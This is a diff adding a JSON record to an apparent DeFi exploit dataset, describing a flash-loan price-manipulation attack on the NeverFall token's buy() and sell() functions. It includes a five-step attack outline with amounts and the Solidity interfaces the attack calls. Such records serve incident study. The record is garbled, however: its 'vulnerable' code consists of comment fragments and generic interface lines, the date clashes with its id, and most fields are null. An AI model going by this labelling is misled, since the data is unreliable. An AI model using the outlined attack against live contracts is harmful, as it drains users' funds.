@@ -1,0 +1,30 @@
+{
+ "id": "2023__2023-05-xx_NeverFall_BuySellPriceManipulation",
+ "source_file": "2023/2023-05-xx_NeverFall_BuySellPriceManipulation.md",
+ "title": "NeverFall Exploit — buy() / sell() Flash Loan Price Manipulation",
+ "date": "2023-01-01",
+ "protocol": "NeverFall",
+ "chain": null,
+ "loss_raw": null,
+ "loss_usd": null,
+ "root_cause": null,
+ "attack_tx": null,
+ "vulnerable_contract": null,
+ "classes": [
+  "oracle-price-manipulation"
+ ],
+ "code_before": [
+  "// File: NeverFallToken.sol\n * manner, since when dealing with meta-transactions the account sending and  // ❌\n\n// ...\n\n     * Internal function without access restriction.  // ❌\n\n// ...\n\n    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);  // ❌\n\n// ...\n\n    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);  // ❌\n\n// ...\n\n    function swapExactTokensForTokensSupportingFeeOnTransferTokens(  // ❌"
+ ],
+ "code_after": [],
+ "steps": [
+  "// → flash loan 1.6M USDT",
+  "// → buy 200K NeverFall at current spot price",
+  "// 1_400_000e18 USDT, 0, [USDT→NeverFall], ...",
+  "// → sell 75.5M NeverFall at now-inflated spot price"
+ ],
+ "other_code": [
+  "// 1. BUSD_USDT_Pool.swap(0, 1_600_000e18, address(this), data)\n//    → flash loan 1.6M USDT\n// 2. NeverFall.buy(200_000e18)\n//    → buy 200K NeverFall at current spot price\n// 3. Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(\n//       1_400_000e18 USDT, 0, [USDT→NeverFall], ...\n//    )  // push NeverFall price up via large AMM swap\n// 4. NeverFall.sell(75_500_000e18)\n//    → sell 75.5M NeverFall at now-inflated spot price\n// 5. Repay flash loan: 1_600_000 USDT + 0.3% fee",
+  "interface INeverFall {\n    function buy(uint256 usdtAmount) external;\n    function sell(uint256 tokenAmount) external;\n}\n\ninterface IUniswapV2Pair {\n    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;\n}\n\ninterface IUniswapV2Router {\n    function swapExactTokensForTokensSupportingFeeOnTransferTokens(\n        uint256 amountIn, uint256 amountOutMin,\n        address[] calldata path, address to, uint256 deadline\n    ) external;\n}"
+ ]
+}
